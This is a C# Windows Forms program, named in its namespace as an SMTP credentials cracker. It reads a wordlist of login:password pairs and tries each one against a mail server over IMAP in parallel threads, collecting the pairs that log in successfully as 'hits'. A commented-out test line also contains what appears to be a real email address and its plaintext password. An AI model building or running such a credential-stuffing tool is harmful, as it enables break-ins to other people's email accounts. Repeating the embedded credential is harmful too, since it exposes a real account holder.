using MailKit.Net.Imap;
using MailKit.Net.Smtp;
using MailKit.Security;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SMTP_Credentials_Cracker
{
    public partial class Form1 : Form
    {
        private List<string> mHits = new List<string>();
        private string mWordlistPath, mHost;
        private int mThreadCounter = 0, mPort,  mCurrentLine = 0, mFailedCounter = 0, mHitsCounter = 0;
        private long mLinesCount;

        public Form1()
        {
            InitializeComponent(); 
            textBox1.AutoSize = false;
            textBox1.Size = new Size(395, 25);
        }

        public static bool TryAuthenticate(string login, string password, string server, int port)
        {
            try
            {
                var smtp = new ImapClient();
                smtp.Timeout = 250;
                smtp.Connect(server, port, SecureSocketOptions.SslOnConnect);
                smtp.Authenticate(login, password);
                bool result = smtp.IsAuthenticated;
                smtp.Disconnect(true);
                return result;
            }

            catch(Exception timeoutException)
            {
                return false;
            }

        }
        

        private void button1_Click(object sender, EventArgs e)
        {
            //TryAuthenticate2("milosz.skiba@wp.pl", "@Kaisal1312@", "smtp.wp.pl", 465);
            //bool b = TryAuthenticate("milosz.skiba@wp.pl", "@Kaisal1312@", "imap.wp.pl", 993);
            
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            mHost = textBoxHost.Text;
            mPort = Convert.ToInt32(textBoxPort.Text);
            int maxThreads = Convert.ToInt32(textBoxThreads.Text);

            new Thread(() => ProgressWatcher()).Start();

            
            ThreadPool.SetMaxThreads(maxThreads, maxThreads);

            using (StreamReader reader = new StreamReader(mWordlistPath))
            {
                string line;

                while ((line = reader.ReadLine()) != null)
                {
                    ThreadPool.QueueUserWorkItem(new WaitCallback(ProcessLine), line.Split(':'));
                    Thread.Sleep(100);
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void ProcessLine(object line)
        {
            string[] _line = (string[])line;

            if (TryAuthenticate(_line[0], _line[1], mHost, mPort))
            {
                mHits.Add($"{_line[0]}:{_line[1]}");
                mHitsCounter++;
            }
            else
                mFailedCounter++;

            mCurrentLine++;
        }

        private void ProgressWatcher()
        {
            while(mCurrentLine < mLinesCount)
            {
                //Thread thisThread = Thread.CurrentThread;

                progressLabel.Invoke((MethodInvoker) delegate {
                    progressLabel.Text = $"Progress {mCurrentLine} of {mLinesCount}";
                });

                textBoxWorkingThreads.Invoke((MethodInvoker)delegate {
                    textBoxWorkingThreads.Text = ThreadPool.ThreadCount.ToString();
                });

                progressBar1.Invoke((MethodInvoker)delegate {
                    progressBar1.Value++;
                });

                textBoxSuccess.Invoke((MethodInvoker)delegate {
                    textBoxSuccess.Text = mHitsCounter.ToString();
                });
                
                textBoxSuccess.Invoke((MethodInvoker)delegate {
                    textBoxFailed.Text = mFailedCounter.ToString();
                });

                Thread.Sleep(100);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                mWordlistPath = openFileDialog.FileName;
                textBox1.Text = mWordlistPath;
                mLinesCount = CountLines();
                progressLabel.Text = $"Progress {mCurrentLine} of {mLinesCount}";
                progressBar1.Maximum = (int)mLinesCount;
            }
        }

        private long CountLines()
        {
            FileStream fs = new FileStream(mWordlistPath, FileMode.Open, FileAccess.Read, FileShare.None, 1024 * 1024);

            long lineCount = 0;
            byte[] buffer = new byte[1024 * 1024];
            int bytesRead;

            do
            {
                bytesRead = fs.Read(buffer, 0, buffer.Length);
                for (int i = 0; i < bytesRead; i++)
                    if (buffer[i] == '\n')
                        lineCount++;
            }
            while (bytesRead > 0);

            fs.Close();

            return lineCount;
        }
    }
}
